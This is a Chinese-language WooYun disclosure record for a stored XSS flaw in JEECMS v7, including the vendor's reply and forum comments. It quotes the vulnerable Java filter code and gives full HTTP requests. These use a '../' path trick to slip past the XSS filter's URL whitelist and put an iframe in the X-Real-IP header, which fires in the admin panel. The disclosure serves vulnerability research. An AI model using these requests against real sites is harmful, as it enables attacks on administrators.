{"id": 87508, "wybug_id": "wooyun-2016-0181732", "wybug_title": "JEECMS XssFilter缺陷导致的存储型XSS漏洞                                      ", "wybug_corp": "JEECMS", "wybug_author": "applychen", "wybug_date": "2016-03-07 09:00", "wybug_open_date": "2016-06-06 14:20", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-03-11：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-05-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-06：\t细节向公众公开  简要描述： 自带的XssFilter绕过。 详细说明：  在官网下载最新的jeecmsV7\nhttp://**.**.**.**/fabu/41667.jhtml\n其中的web.xml中配置了XssFilter如下：\n<filter>\t\t<filter-name>XssFilter</filter-name>\t\t<filter-class>**.**.**.**mon.web.XssFilter</filter-class>\t\t<init-param>\t\t\t<param-name>excludeUrls</param-name>\t\t\t<param-value>/member/contribute@/jeeadmin/jeecms@/flow_statistic</param-value>    \t</init-param>    \t<init-param>\t\t\t<param-name>SplitChar</param-name>\t\t\t<param-value>@</param-value>    \t</init-param>    \t<init-param>\t\t\t<param-name>FilterChar</param-name>\t\t\t<param-value>'@\"@\\@#@:@%@></param-value>    \t</init-param>\t\t<init-param>\t\t\t<param-name>ReplaceChar</param-name>\t\t\t<param-value>‘@“@＼@＃@：@％@＞</param-value>    \t</init-param>\t</filter>\n在**.**.**.**mon.web.XssFilter中代码如下：\npublic class XssFilter implements Filter {\tprivate String filterChar;\tprivate String replaceChar;\tprivate String splitChar;\tprivate String excludeUrls;\tFilterConfig filterConfig = null;\tpublic void init(FilterConfig filterConfig) throws ServletException {\t\tthis.filterChar=filterConfig.getInitParameter(\"FilterChar\");\t\tthis.replaceChar=filterConfig.getInitParameter(\"ReplaceChar\");\t\tthis.splitChar=filterConfig.getInitParameter(\"SplitChar\");\t\tthis.excludeUrls=filterConfig.getInitParameter(\"excludeUrls\");\t\tthis.filterConfig = filterConfig;\t}\tpublic void destroy() {\t\tthis.filterConfig = null;\t}\tpublic void doFilter(ServletRequest request, ServletResponse response,\tFilterChain chain) throws IOException, ServletException {\t\tif(isExcludeUrl(request)){\t\t\tchain.doFilter(request, response);\t\t}else{\t\t\tchain.doFilter(new XssHttpServletRequestWrapper((HttpServletRequest) request,filterChar,replaceChar,splitChar), response);\t\t}\t}\t\t\tprivate boolean isExcludeUrl(ServletRequest request){\t\tboolean exclude=false;\t\tif(StringUtils.isNotBlank(excludeUrls)){\t\t\t String[]excludeUrl=excludeUrls.split(splitChar);\t\t\t if(excludeUrl!=null&&excludeUrl.length>0){\t\t\t\t for(String url:excludeUrl){\t\t\t\t\t if(URLHelper.getURI((HttpServletRequest)request).startsWith(url)){\t\t\t\t\t\t exclude=true;\t\t\t\t\t }\t\t\t\t }\t\t\t }\t\t}\t\treturn exclude;\t}}\n注意其中的isExcludeUrl(ServletRequest request)方法，isExcludeUrl()用于排除web.xml中定义的URL（即白名单，XssFilter不检查web.xml定义页面中的XSS字符）如下（以@分割）：\n<init-param>\t\t\t<param-name>excludeUrls</param-name>\t\t\t<param-value>/member/contribute@/jeeadmin/jeecms@/flow_statistic</param-value>    \t</init-param>\n在具体实现xss白名单的的时候使用的是startsWith()：\nif(URLHelper.getURI((HttpServletRequest)request).startsWith(url)){\t\t\t\t\t\t exclude=true;\t\t\t\t\t }\n即URI目录以以下字符开头即可绕过XssFilter的检查：\n/member/contribute/jeeadmin/jeecms/flow_statistic\n再来看RequestUtils.java中的getIpAddr(HttpServletRequest request)方法：\npublic static String getIpAddr(HttpServletRequest request) {\t\tString ip = request.getHeader(\"X-Real-IP\");\t\tif (!StringUtils.isBlank(ip) && !\"unknown\".equalsIgnoreCase(ip)) {\t\t\treturn ip;\t\t}\t\tip = request.getHeader(\"X-Forwarded-For\");\t\tif (!StringUtils.isBlank(ip) && !\"unknown\".equalsIgnoreCase(ip)) {\t\t\t// 多次反向代理后会有多个IP值，第一个为真实IP。\t\t\tint index = ip.indexOf(',');\t\t\tif (index != -1) {\t\t\t\treturn ip.substring(0, index);\t\t\t} else {\t\t\t\treturn ip;\t\t\t}\t\t} else {\t\t\treturn request.getRemoteAddr();\t\t}\t}\n此方法用于获取ip地址，可以从以下两个HTTP头中获取：\nX-Real-IPX-Forwarded-For\ngetIpAddr(HttpServletRequest request)在CommentAct.java中被调用：\n@RequestMapping(value = \"/comment.jspx\", method = RequestMethod.POST)\tpublic void submit(Integer contentId, Integer score,String text, String captcha,\t\t\tHttpServletRequest request, HttpServletResponse response,\t\t\tModelMap model) throws JSONException {\t\t……\t\t\tcmsCommentM**.**.**.**ment(score,text, RequestUtils.getIpAddr(request),\t\t\t\t\tcontentId, site.getId(), userId, checked, false);\t\t\tjson.put(\"success\", true);\t\t\tjson.put(\"status\", 0);\t\t}\t\tResponseUtils.renderJson(response, json.toString());\t}\n通过cmsCommentM**.**.**.**ment()直接把IP地址RequestUtils.getIpAddr(request)写入到数据库，首先是正常的在前台文章进行评论，抓包写入HTTP头：\n\n在后台查看可以看到>符号被替换为＞：\n\n下面来开始绕过，前台评论：\n\n抓包拦截，将URL修改为以/jeeadmin/jeecms/开头：\n/jeeadmin/jeecms/../../comment.jspx\n添加获取IP的HTTP头：\nX-Real-IP: <iframe src=http://**.**.**.**></iframe>\n整个包如下：\nPOST /jeeadmin/jeecms/../../comment.jspx HTTP/1.1Host: **.**.**.**:8080User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateX-Real-IP: <iframe src=http://**.**.**.**></iframe>Content-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://**.**.**.**:8080/gnxw/587.jhtmlContent-Length: 85Cookie: JSESSIONID=DC196DF35057163936FA768EA9426CC5; clientlanguage=zh_CN; pgv_pvid=6516730796; _site_id_cookie=1Connection: keep-alivetext=testabc&captcha=xpxq&contentId=587&Submit=+%E9%A9%AC%E4%B8%8A%E5%8F%91%E8%A1%A8+\n当管理员在后台审核评论时即可触发跨站，如下图：\n\nRequestUtils.getIpAddr(request)还在登录时被调用了，前台登录：\nPOST /jeeadmin/jeecms/../../login.jspx HTTP/1.1Host: **.**.**.**:8080User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateX-Real-IP: <iframe src=http://**.**.**.**></iframe>Referer: http://**.**.**.**:8080/login.jspx?returnUrl=/Cookie: JSESSIONID=E83E40D41B18500DEC0DB3C1EFD1A749; clientlanguage=zh_CN; pgv_pvid=6516730796; _site_id_cookie=1; __qc_wId=506Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 59returnUrl=%2F&username=xxooxx1&password=111111&captcha=dupa\n登录成功后，管理员在后台点击用户模块即可触发跨站：\n\nRequestUtils.getIpAddr(request)，后台登录调用：\nPOST /jeeadmin/jeecms/login.do HTTP/1.1Host: **.**.**.**:8080User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateX-Real-IP: <iframe src=http://**.**.**.**></iframe>Referer: **.**.**.**:8080/jeeadmin/jeecms/login.doCookie: pgv_pvid=1466705356; tm_last_login_uid=postmaster; tm_last_login_domain=root; tm_ibc=0; JSESSIONID=38DA86D43D85C0174FB6B08D407973A4; clientlanguage=zh_CN; _site_id_cookie=1Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 58username=aaaaaaa&password=aaaaaaaa&submit.x=21&submit.y=10\n管理员在后台查看登录失败日志即可触发跨站：\n\n   漏洞证明：  同上   修复方案：  1. 在获取URLHelper.getURI((HttpServletRequest)request)时候检查其中是否有../字符2. 在旧版本中检查了IP地址的合法性，但是新版的v7反而没有了，可以添加上。   版权声明：转载请注明来源 applychen@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2016-03-08 14:17 厂商回复： 感谢对JEECMS的关注与支持，漏洞会尽早修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-03-07 09:32 |    \t\t爱上襄阳 \t\t\t( 普通白帽子  |\t\t\t        Rank:351 漏洞数:88        | ...)\t\t \n  applychen，我偶像！    \n     2016-03-08 09:52 |    \t\tWens0n \t\t\t( 普通白帽子  |\t\t\t        Rank:102 漏洞数:23        | 精华漏洞数:32 | WooYun认证√  舞蹈系教授)\t\t \n  @applychen 是不是要把开源程序都审计一篇，哈哈    \n     2016-03-14 23:54 |    \t\tramos \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:1        | hello)\t\t \n  我猜是jeecms在web的xml配置的xssfilter对flow_statistic.jspx文件f放行，导致对page和reffer参数放行，管理员后台点击来源页面触发xss，楼主我们说的是不是同一个    \n     2016-03-15 01:03 |    \t\tapplychen  \t\t\t( 普通白帽子  |\t\t\t        Rank:667 漏洞数:57        | 万古漫漫长如夜)\t\t \n  @ramos 有点擦边    \n     2016-03-15 09:44 |    \t\tLoveSnow \t\t\t( 实习白帽子  |\t\t\t        Rank:85 漏洞数:20        | 以正和，以奇胜！)\t\t \n  @applychen能不能给我留个cms，我正在代码审计，结果你就给报了，唉。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}